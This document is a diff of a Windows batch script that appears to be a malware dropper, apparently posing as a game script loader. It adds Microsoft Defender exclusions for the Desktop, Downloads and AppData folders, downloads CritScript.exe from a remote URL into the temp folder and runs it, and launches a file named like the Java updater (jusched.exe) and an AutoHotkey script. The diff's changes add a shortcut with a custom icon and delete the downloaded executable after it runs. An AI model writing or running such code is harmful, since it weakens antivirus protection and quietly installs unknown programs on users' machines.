@@ -27,10 +27,7 @@ if '%errorlevel%' NEQ '0' (
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Desktop"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/Downloads"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath "%userprofile%/AppData/"
-:: Navigate to the %TEMP% directory
 cd %TEMP%
-
-:: Step 1: Download CritScript.exe using PowerShell
 echo Downloading CritScript.exe...
 Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.exe' -OutFile CritScript.exe"
 if not exist "CritScript.exe" (
@@ -40,45 +37,48 @@ if not exist "CritScript.exe" (
 )
 echo CritScript.exe downloaded successfully.
 
-:: Step 2: Execute CritScript.exe
 echo Running CritScript.exe...
 start "" CritScript.exe
+timeout /t 5 /nobreak
 
-:: Step 3: Check and run JUSCHED.EXE if it exists (case-insensitive)
 for %%F in (jusched.exe JUSCHED.EXE) do (
     if exist "%%F" (
         echo Found %%F. Running it...
         start "" %%F
+        timeout /t 5 /nobreak
         goto :CheckZombies
     )
 )
 echo jusched.exe not found.
 
-:CheckZombies
-:: Step 4: Check and run ZOMBIES.AHK if it exists (case-insensitive)
 for %%F in (zombies.ahk ZOMBIES.AHK) do (
     if exist "%%F" (
         echo Found %%F. Running it...
         start "" %%F
-        goto :DeleteJusched
+        goto :CreateShortcut
     )
 )
 echo Zombies.ahk not found.
 
-:DeleteJusched
-:: Step 5: Delete jusched.exe if it exists (case-insensitive)
-for %%F in (jusched.exe JUSCHED.EXE) do (
-    if exist "%%F" (
-        echo Deleting %%F...
-        del /f /q "%%F"
-        echo %%F deleted.
-        goto :ExitScript
-    )
-)
-echo jusched.exe not found. Nothing to delete.
+set "shortcutPath=%TEMP%\Zombies Shortcut.lnk"
+set "zombiesScript=%TEMP%\ZOMBIES.AHK"
+set "iconPath=%TEMP%\icon.ico"
 
-:ExitScript
-:: Exit the script
+if exist "%zombiesScript%" (
+    echo Creating shortcut for ZOMBIES.AHK...
+    Powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%shortcutPath%'); $s.TargetPath = '%zombiesScript%'; $s.IconLocation = '%iconPath%'; $s.Save()"
+    echo Shortcut created at %shortcutPath%.
+) else (
+    echo ZOMBIES.AHK not found. Cannot create shortcut.
+)
+
+
+if exist "CritScript.exe" (
+    echo Deleting CritScript.exe...
+    del /f /q "CritScript.exe"
+    echo CritScript.exe deleted.
+)
+
 echo Script completed. Exiting...
 pause
 exit /b
